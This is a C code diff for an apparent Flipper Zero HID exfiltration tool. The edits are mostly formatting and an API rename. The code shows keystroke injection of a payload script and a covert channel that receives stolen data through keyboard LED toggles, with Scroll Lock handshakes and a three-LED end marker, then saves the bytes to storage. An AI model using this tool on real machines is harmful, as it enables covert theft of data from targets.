@@ -230,8 +230,8 @@ static bool phase_inject(HidExfilWorker* worker) {
     if(!worker->running || worker->state.abort_requested) return false;
 
     /* Get the payload script */
-    const char* script = hid_exfil_get_payload_script(
-        worker->payload_type, worker->config.target_os);
+    const char* script =
+        hid_exfil_get_payload_script(worker->payload_type, worker->config.target_os);
 
     /* Type the script */
     type_string(script, delay, worker);
@@ -264,12 +264,12 @@ static bool phase_sync(HidExfilWorker* worker) {
     }
 
     /* Wait for target to toggle Scroll Lock back (acknowledgment) */
-    uint8_t prev_led = furi_hal_hid_kb_leds_get();
+    uint8_t prev_led = furi_hal_hid_get_led_state();
     uint8_t prev_scroll = prev_led & HID_KB_LED_SCROLL;
     uint32_t timeout_start = furi_get_tick();
 
     while(worker->running && !worker->state.abort_requested) {
-        uint8_t led = furi_hal_hid_kb_leds_get();
+        uint8_t led = furi_hal_hid_get_led_state();
         uint8_t cur_scroll = led & HID_KB_LED_SCROLL;
 
         /* Update LED state for UI */
@@ -295,7 +295,7 @@ static bool phase_sync(HidExfilWorker* worker) {
                 furi_hal_hid_kb_release(HID_KEYBOARD_SCROLL_LOCK);
                 furi_delay_ms(HID_EXFIL_SYNC_INTERVAL_MS);
             }
-            prev_led = furi_hal_hid_kb_leds_get();
+            prev_led = furi_hal_hid_get_led_state();
             prev_scroll = prev_led & HID_KB_LED_SCROLL;
         }
 
@@ -315,7 +315,7 @@ static bool phase_receive(HidExfilWorker* worker) {
         worker->callback(PhaseReceiving, 0, worker->callback_context);
     }
 
-    uint8_t prev_led = furi_hal_hid_kb_leds_get();
+    uint8_t prev_led = furi_hal_hid_get_led_state();
     uint8_t prev_scroll = prev_led & HID_KB_LED_SCROLL;
     uint32_t last_clock_tick = furi_get_tick();
 
@@ -338,7 +338,7 @@ static bool phase_receive(HidExfilWorker* worker) {
             last_clock_tick = furi_get_tick(); /* reset timeout during pause */
         }
 
-        uint8_t led = furi_hal_hid_kb_leds_get();
+        uint8_t led = furi_hal_hid_get_led_state();
         uint8_t cur_scroll = led & HID_KB_LED_SCROLL;
 
         /* Update LED indicators for UI */
@@ -382,13 +382,11 @@ static bool phase_receive(HidExfilWorker* worker) {
             }
 
             /* Check for EOT: all 3 LEDs toggled simultaneously */
-            uint8_t cur_all =
-                led & (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL);
+            uint8_t cur_all = led & (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL);
             if(cur_all != prev_all_state) {
                 /* Check if ALL bits changed */
                 uint8_t changed = cur_all ^ prev_all_state;
-                if(changed ==
-                   (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL)) {
+                if(changed == (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL)) {
                     if(eot_count == 0) {
                         /* First EOT toggle: snapshot the byte count from
                          * before this dibit was accumulated. This is the
@@ -424,8 +422,7 @@ static bool phase_receive(HidExfilWorker* worker) {
         }
 
         /* Clock timeout detection */
-        if(furi_get_tick() - last_clock_tick >
-           furi_ms_to_ticks(HID_EXFIL_CLOCK_TIMEOUT_MS)) {
+        if(furi_get_tick() - last_clock_tick > furi_ms_to_ticks(HID_EXFIL_CLOCK_TIMEOUT_MS)) {
             if(worker->state.bytes_received > 0) {
                 FURI_LOG_W(
                     TAG,
@@ -532,8 +529,7 @@ static void save_received_data(HidExfilWorker* worker) {
     }
 
     File* file = storage_file_alloc(storage);
-    if(storage_file_open(
-           file, furi_string_get_cstr(path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+    if(storage_file_open(file, furi_string_get_cstr(path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
         storage_file_write(file, worker->recv_buffer, worker->state.bytes_received);
         FURI_LOG_I(
             TAG,
